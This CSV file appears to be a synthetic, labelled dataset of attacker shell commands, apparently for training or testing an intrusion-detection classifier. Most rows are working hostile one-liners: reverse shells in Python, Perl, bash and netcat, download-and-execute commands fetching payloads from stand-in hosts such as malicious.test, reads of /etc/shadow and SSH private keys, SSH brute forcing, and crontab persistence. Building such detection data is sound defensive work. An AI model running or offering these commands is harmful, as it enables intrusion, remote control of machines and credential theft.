id,timestamp,log,label
log-609,2025-08-31T02:53:54.544425Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-610,2025-07-20T22:56:23.544434Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-611,2025-11-04T13:05:18.544444Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
log-612,2024-12-31T06:46:29.544453Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-613,2025-08-08T12:30:39.544462Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-614,2024-12-13T23:47:39.544471Z,wget http://malicious.test/update76.sh && chmod +x update76.sh && ./ update76.sh,malware_download
log-615,2025-11-26T04:24:32.544481Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-616,2025-01-13T14:41:45.544490Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-617,2025-07-06T00:37:16.544499Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-618,2025-07-20T00:59:27.544508Z,mkdir /tmp/backdoor5; chmod 777 /tmp/backdoor5,persistence_or_filesystem
log-619,2025-11-03T15:05:47.544517Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-620,2025-04-23T04:33:55.544526Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
log-621,2024-12-06T04:16:16.544535Z,"python3 -c 'import urllib.request as u;open(""/tmp/p21.py"",""wb"").write(u.urlopen(""http://malicious.test/p21.py"").read())'; python3 /tmp/p21.py",malware_download
log-622,2025-08-28T00:50:03.544545Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-623,2025-04-14T20:41:18.544554Z,sshpass -p 'toor' ssh admin@192.0.2.12,brute_force
log-624,2025-02-19T23:38:04.544563Z,bash -i >& /dev/tcp/192.0.2.12/6666 0>&1,reverse_shell
log-625,2025-07-12T09:54:54.544573Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme27.py"",""wb"").write(u.urlopen(""http://payloads.net/runme27.py"").read())'; python3 /tmp/runme27.py",malware_download
log-626,2025-11-22T17:20:29.544583Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-627,2025-06-24T13:25:57.544591Z,echo 'hello world',unknown
log-628,2025-06-19T19:21:24.544600Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-629,2025-05-18T14:24:11.544609Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-630,2025-03-10T12:08:41.544619Z,wget http://malware.srv/update60.sh && chmod +x update60.sh && ./ update60.sh,malware_download
log-631,2025-07-25T05:35:27.544630Z,wget http://badhost.local/runme47.sh && chmod +x runme47.sh && ./ runme47.sh,malware_download
log-632,2025-01-04T04:43:38.544638Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-633,2024-12-10T10:53:57.544647Z,find / -name '*.conf' -type f,enumeration
log-634,2025-06-12T00:30:00.544656Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-635,2025-08-02T09:46:17.544665Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
log-636,2025-09-20T02:51:21.544674Z,cat /etc/shadow,credential_harvest
log-637,2025-02-18T23:11:55.544684Z,"python3 -c 'import urllib.request as u;open(""/tmp/p84.py"",""wb"").write(u.urlopen(""http://payloads.net/p84.py"").read())'; python3 /tmp/p84.py",malware_download
log-638,2025-09-06T19:09:58.544693Z,wget http://badhost.local/payload78.sh && chmod +x payload78.sh && ./ payload78.sh,malware_download
log-639,2025-01-06T22:17:43.544702Z,echo '@reboot root /tmp/install52.sh' >> /etc/crontab,persistence_or_filesystem
log-640,2025-03-19T20:37:48.544712Z,"python3 -c 'import urllib.request as u;open(""/tmp/update86.py"",""wb"").write(u.urlopen(""http://payloads.net/update86.py"").read())'; python3 /tmp/update86.py",malware_download
log-641,2025-01-18T12:23:47.544721Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-642,2025-10-27T10:31:04.544730Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
log-643,2025-03-19T23:59:18.544740Z,bash -i >& /dev/tcp/45.23.11.9/6666 0>&1,reverse_shell
log-644,2025-03-25T03:18:53.544749Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 80 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-645,2025-02-09T11:20:28.544759Z,"python3 -c 'import urllib.request as u;open(""/tmp/p54.py"",""wb"").write(u.urlopen(""http://malicious.test/p54.py"").read())'; python3 /tmp/p54.py",malware_download
log-646,2025-10-13T12:06:47.544768Z,cat /etc/shadow,credential_harvest
log-647,2025-02-01T10:11:10.544777Z,sshpass -p '123456' ssh admin@1.2.3.4,brute_force
log-648,2024-12-15T21:03:15.544787Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-649,2025-07-05T11:02:03.544796Z,find / -name '*.conf' -type f,enumeration
log-650,2025-02-10T19:04:24.544805Z,"python3 -c 'import urllib.request as u;open(""/tmp/install61.py"",""wb"").write(u.urlopen(""http://evil.example/install61.py"").read())'; python3 /tmp/install61.py",malware_download
log-651,2025-04-01T13:21:19.544815Z,"python3 -c 'import urllib.request as u;open(""/tmp/install64.py"",""wb"").write(u.urlopen(""http://evil.example/install64.py"").read())'; python3 /tmp/install64.py",malware_download
log-652,2025-02-14T16:24:26.544824Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
log-653,2025-09-15T17:25:15.544833Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-654,2025-07-09T13:41:39.544842Z,cat /etc/shadow,credential_harvest
log-655,2025-04-03T23:12:25.544865Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-656,2025-11-13T03:14:49.544883Z,curl -fsSL http://malware.srv/update31.php -o /tmp/update31.php; php /tmp/update31.php,malware_download
log-657,2025-01-24T19:39:13.544893Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-658,2025-03-18T05:54:20.544903Z,curl -fsSL http://payloads.net/payload35.php -o /tmp/payload35.php; php /tmp/payload35.php,malware_download
log-659,2025-11-15T09:26:12.544913Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-660,2025-06-18T22:53:27.544922Z,wget http://malicious.test/payload64.sh && chmod +x payload64.sh && ./ payload64.sh,malware_download
log-661,2025-09-11T00:48:14.544931Z,curl -fsSL http://payloads.net/install44.php -o /tmp/install44.php; php /tmp/install44.php,malware_download
log-662,2025-05-01T12:51:19.544942Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-663,2025-03-18T01:22:25.544950Z,echo '@reboot root /tmp/x99.sh' >> /etc/crontab,persistence_or_filesystem
log-664,2025-01-17T08:58:57.544960Z,curl http://payloads.net/payload -o /tmp/p ; bash /tmp/p,malware_download
log-665,2025-01-28T22:33:36.544969Z,date; whoami,unknown
log-666,2025-10-25T02:33:40.544978Z,cat /etc/shadow,credential_harvest
log-667,2025-06-15T04:45:45.544987Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-668,2025-05-30T18:26:59.544997Z,wget http://malware.srv/runme55.sh ; chmod +x runme55.sh ; ./ runme55.sh,malware_download
log-669,2025-06-16T19:18:40.545005Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-670,2025-05-27T08:59:12.545014Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-671,2025-05-03T12:54:17.545023Z,cat /etc/passwd,credential_harvest
log-672,2025-05-18T18:18:23.545032Z,wget http://payloads.net/p48.sh && chmod +x p48.sh && ./ p48.sh,malware_download
log-673,2024-12-07T11:14:32.545041Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-674,2025-10-11T23:30:23.545051Z,wget http://malicious.test/payload48.sh && chmod +x payload48.sh && ./ payload48.sh,malware_download
log-675,2025-04-03T02:53:18.545060Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""203.0.113.7"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-676,2025-10-05T07:58:19.545069Z,find / -name '*.conf' -type f,enumeration
log-677,2025-01-30T23:04:18.545078Z,nc -e /bin/sh 192.0.2.12 6666,reverse_shell
log-678,2024-12-31T05:12:10.545087Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-679,2024-12-10T03:00:14.545097Z,sshpass -p '123456' ssh root@10.0.0.5,brute_force
log-680,2025-03-14T21:00:41.545106Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-681,2025-02-13T11:43:59.545115Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-682,2025-03-11T16:21:06.545124Z,curl http://payloads.net/payload -o /tmp/p ; bash /tmp/p,malware_download
log-683,2025-10-22T22:17:31.545134Z,nc -e /bin/sh 1.2.3.4 6666,reverse_shell
log-684,2025-05-22T00:18:43.545143Z,"perl -e 'use Socket;$i=""1.2.3.4"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-685,2025-03-21T09:32:30.545153Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-686,2025-01-16T19:23:49.545162Z,nc -e /bin/sh 1.2.3.4 9001,reverse_shell
log-687,2025-02-19T13:05:52.545172Z,mkdir /tmp/persist39; chmod 777 /tmp/persist39,persistence_or_filesystem
log-688,2025-05-04T07:41:41.545181Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
log-689,2025-07-31T14:03:58.545191Z,sshpass -p 'toor' ssh admin@203.0.113.7,brute_force
log-690,2025-10-22T13:30:52.545200Z,some-weird-tool --foo bar,unknown
log-691,2024-12-09T11:25:27.545209Z,cat /etc/passwd,credential_harvest
log-692,2025-04-08T03:45:05.545218Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-693,2025-11-21T11:41:55.545228Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-694,2025-05-31T20:52:50.545237Z,cat /etc/shadow,credential_harvest
log-695,2025-08-15T19:22:41.545246Z,sshpass -p 'password' ssh ubuntu@10.0.0.5,brute_force
log-696,2025-07-17T07:11:12.545255Z,date; whoami,unknown
log-697,2025-07-27T07:09:27.545264Z,sshpass -p 'toor' ssh admin@45.23.11.9,brute_force
log-698,2025-05-02T04:34:13.545273Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-699,2025-06-04T09:04:28.545282Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-700,2025-06-19T00:55:43.545291Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-701,2025-11-04T05:06:55.545299Z,find / -name '*.conf' -type f,enumeration
log-702,2025-08-06T15:29:56.545308Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-703,2025-11-06T02:41:35.545318Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-704,2025-10-16T01:52:33.545327Z,nc -e /bin/sh 1.2.3.4 443,reverse_shell
log-705,2025-05-24T11:00:21.545336Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-706,2025-10-16T03:27:35.545345Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-707,2025-01-23T11:43:08.545353Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-708,2025-02-11T08:12:17.545363Z,curl -fsSL http://evil.example/payload84.php -o /tmp/payload84.php; php /tmp/payload84.php,malware_download
log-709,2025-08-07T09:26:38.545372Z,cat /etc/passwd,credential_harvest
log-710,2025-09-01T10:35:11.545380Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-711,2025-04-19T02:22:15.545389Z,cat /etc/shadow,credential_harvest
log-712,2025-05-28T20:25:54.545398Z,sshpass -p 'password' ssh ec2-user@172.16.0.9,brute_force
log-713,2025-04-25T20:49:45.545407Z,sshpass -p 'toor' ssh ubuntu@1.2.3.4,brute_force
log-714,2025-09-08T15:32:05.545416Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-715,2025-01-05T23:52:01.545425Z,find / -name '*.conf' -type f,enumeration
log-716,2025-11-03T23:35:34.545434Z,bash -i >& /dev/tcp/192.0.2.12/8080 0>&1,reverse_shell
log-717,2025-08-04T02:13:31.545444Z,curl -fsSL http://malicious.test/update77.php -o /tmp/update77.php; php /tmp/update77.php,malware_download
log-718,2025-03-21T06:38:29.545454Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-719,2025-03-16T11:00:13.545463Z,find / -name '*.conf' -type f,enumeration
log-720,2025-02-11T04:15:03.545472Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
log-721,2025-02-17T22:11:00.545482Z,curl -fsSL http://malicious.test/x40.php -o /tmp/x40.php; php /tmp/x40.php,malware_download
log-722,2025-02-12T02:24:33.545491Z,echo '@reboot root /tmp/update57.sh' >> /etc/crontab,persistence_or_filesystem
log-723,2025-07-20T13:59:07.545500Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
log-724,2025-08-13T00:19:27.545510Z,"python3 -c 'import urllib.request as u;open(""/tmp/p38.py"",""wb"").write(u.urlopen(""http://malicious.test/p38.py"").read())'; python3 /tmp/p38.py",malware_download
log-725,2024-12-22T17:54:51.545519Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-726,2025-01-06T03:28:27.545529Z,curl -fsSL http://malware.srv/update52.php -o /tmp/update52.php; php /tmp/update52.php,malware_download
log-727,2025-04-14T15:30:15.545538Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
log-728,2025-09-26T06:52:50.545547Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-729,2025-05-14T08:20:01.545556Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-730,2025-08-24T13:41:04.545565Z,nc -e /bin/sh 1.2.3.4 8080,reverse_shell
log-731,2025-10-14T07:46:35.545575Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme39.py"",""wb"").write(u.urlopen(""http://malicious.test/runme39.py"").read())'; python3 /tmp/runme39.py",malware_download
log-732,2025-01-03T08:48:52.545585Z,"python3 -c 'import urllib.request as u;open(""/tmp/update27.py"",""wb"").write(u.urlopen(""http://evil.example/update27.py"").read())'; python3 /tmp/update27.py",malware_download
log-733,2025-05-06T10:29:40.545595Z,wget http://badhost.local/install51.sh ; chmod +x install51.sh ; ./ install51.sh,malware_download
log-734,2025-01-31T06:58:07.545604Z,cat /etc/shadow,credential_harvest
log-735,2025-11-04T13:22:17.545613Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-736,2025-10-21T17:25:28.545621Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-737,2025-09-06T05:24:58.545630Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-738,2025-07-19T05:02:21.545639Z,cat /etc/shadow,credential_harvest
log-739,2025-10-29T00:04:34.545648Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
log-740,2025-10-30T04:38:48.545657Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 8080 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-741,2025-10-09T22:56:17.545666Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-742,2025-07-17T22:01:55.545675Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-743,2025-12-01T17:57:30.545685Z,wget http://malware.srv/payload95.sh ; chmod +x payload95.sh ; ./ payload95.sh,malware_download
log-744,2025-01-13T00:09:52.545694Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
log-745,2025-05-29T19:13:20.545704Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-746,2025-10-18T21:47:41.545713Z,wget http://payloads.net/runme86.sh && chmod +x runme86.sh && ./ runme86.sh,malware_download
log-747,2025-08-22T08:11:03.545723Z,cat /etc/passwd,credential_harvest
log-748,2025-01-06T16:23:35.545732Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-749,2025-07-05T06:06:11.545742Z,curl -fsSL http://payloads.net/p9.php -o /tmp/p9.php; php /tmp/p9.php,malware_download
log-750,2024-12-16T23:04:02.545753Z,sshpass -p 'toor' ssh ubuntu@203.0.113.7,brute_force
log-751,2025-02-10T03:25:23.545763Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-752,2025-05-29T09:44:56.545772Z,nc -e /bin/sh 45.23.11.9 80,reverse_shell
log-753,2025-06-21T23:01:07.545782Z,bash -i >& /dev/tcp/45.23.11.9/80 0>&1,reverse_shell
log-754,2025-08-04T20:24:49.545791Z,nc -e /bin/sh 192.0.2.12 80,reverse_shell
log-755,2025-01-19T03:41:13.545800Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
log-756,2025-02-28T20:27:58.545810Z,"python3 -c 'import urllib.request as u;open(""/tmp/x12.py"",""wb"").write(u.urlopen(""http://evil.example/x12.py"").read())'; python3 /tmp/x12.py",malware_download
log-757,2025-09-07T05:50:55.545819Z,nc -e /bin/sh 172.16.0.9 2222,reverse_shell
log-758,2025-05-27T21:47:56.545828Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-759,2025-10-25T16:58:34.545837Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 80 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-760,2025-05-28T07:26:24.545846Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-761,2025-03-25T14:16:51.545854Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-762,2025-11-17T23:22:30.545866Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-763,2025-11-07T04:12:30.545876Z,bash -i >& /dev/tcp/192.0.2.12/9001 0>&1,reverse_shell
log-764,2024-12-31T04:24:40.545886Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-765,2024-12-07T13:54:48.545895Z,"python3 -c 'import urllib.request as u;open(""/tmp/p99.py"",""wb"").write(u.urlopen(""http://malicious.test/p99.py"").read())'; python3 /tmp/p99.py",malware_download
log-766,2025-03-09T03:55:56.545913Z,nc -e /bin/sh 45.23.11.9 2222,reverse_shell
log-767,2025-07-22T20:16:43.545922Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-768,2025-05-07T04:04:36.545931Z,echo '@reboot root /tmp/p9.sh' >> /etc/crontab,persistence_or_filesystem
log-769,2025-10-11T11:29:56.545941Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-770,2025-01-21T23:55:53.545950Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-771,2025-02-10T19:21:32.545958Z,find / -name '*.conf' -type f,enumeration
log-772,2025-08-20T08:53:22.545967Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-773,2025-05-01T15:39:13.545976Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-774,2025-10-17T03:47:41.545985Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-775,2025-08-01T14:29:35.545995Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
log-776,2025-06-06T02:14:28.546004Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-777,2025-05-01T10:34:19.546012Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-778,2025-03-28T00:44:10.546021Z,some-weird-tool --foo bar,unknown
log-779,2025-01-04T00:39:03.546031Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-780,2025-09-28T08:26:42.546042Z,wget http://malicious.test/runme33.sh ; chmod +x runme33.sh ; ./ runme33.sh,malware_download
log-781,2025-05-25T04:05:55.546051Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-782,2025-06-15T06:20:45.546061Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-783,2025-11-05T06:25:25.546069Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-784,2025-05-19T03:34:21.546079Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-785,2025-02-02T17:35:21.546089Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-786,2025-03-28T17:17:39.546098Z,wget http://malware.srv/runme74.sh && chmod +x runme74.sh && ./ runme74.sh,malware_download
log-787,2025-04-01T13:38:30.546108Z,cat /etc/shadow,credential_harvest
log-788,2025-05-20T13:40:08.546117Z,bash -i >& /dev/tcp/203.0.113.7/2222 0>&1,reverse_shell
log-789,2025-01-05T21:56:50.546126Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
log-790,2025-02-16T00:11:43.546135Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-791,2025-11-10T23:38:05.546144Z,cat /etc/passwd,credential_harvest
log-792,2025-05-17T10:07:00.546153Z,some-weird-tool --foo bar,unknown
log-793,2025-01-06T11:42:03.546162Z,bash -i >& /dev/tcp/172.16.0.9/443 0>&1,reverse_shell
log-794,2024-12-17T00:27:52.546171Z,nc -e /bin/sh 1.2.3.4 4444,reverse_shell
log-795,2025-11-04T08:20:13.546180Z,find / -name '*.conf' -type f,enumeration
log-796,2025-01-03T23:38:07.546190Z,wget http://payloads.net/payload75.sh && chmod +x payload75.sh && ./ payload75.sh,malware_download
log-797,2025-09-16T00:42:35.546199Z,curl -fsSL http://evil.example/p17.php -o /tmp/p17.php; php /tmp/p17.php,malware_download
log-798,2025-12-06T18:51:55.546208Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-799,2025-10-18T02:16:42.546217Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-800,2025-06-06T17:48:27.546226Z,bash -i >& /dev/tcp/10.0.0.5/443 0>&1,reverse_shell
log-801,2025-10-25T18:39:10.546240Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme21.py"",""wb"").write(u.urlopen(""http://evil.example/runme21.py"").read())'; python3 /tmp/runme21.py",malware_download
log-802,2025-05-30T07:23:08.546248Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-803,2025-08-03T01:05:04.546257Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-804,2025-08-13T17:56:38.546266Z,nc -e /bin/sh 192.0.2.12 4444,reverse_shell
